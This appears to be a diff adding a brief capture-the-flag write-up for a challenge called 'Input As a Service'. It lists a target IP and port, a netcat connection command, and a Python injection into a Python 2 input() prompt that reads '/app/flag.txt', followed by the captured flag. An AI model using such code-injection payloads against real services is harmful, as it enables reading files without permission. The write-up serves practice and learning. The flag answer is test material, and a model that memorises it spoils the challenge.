@@ -1,0 +1,17 @@
+Input As a Service
+
+165.227.234.7:32177
+
+nc -nv 165.227.234.7 32177
+
+Solution:
+connect to port
+open('/app/flag.txt', 'r').readlines()
+text
+
+['CHTB{4li3n5_us3_pyth0n2.X?!}']
+
+- I guess I can control the text variable? even though the line is:
+	text = input(' ')
+
+idk man
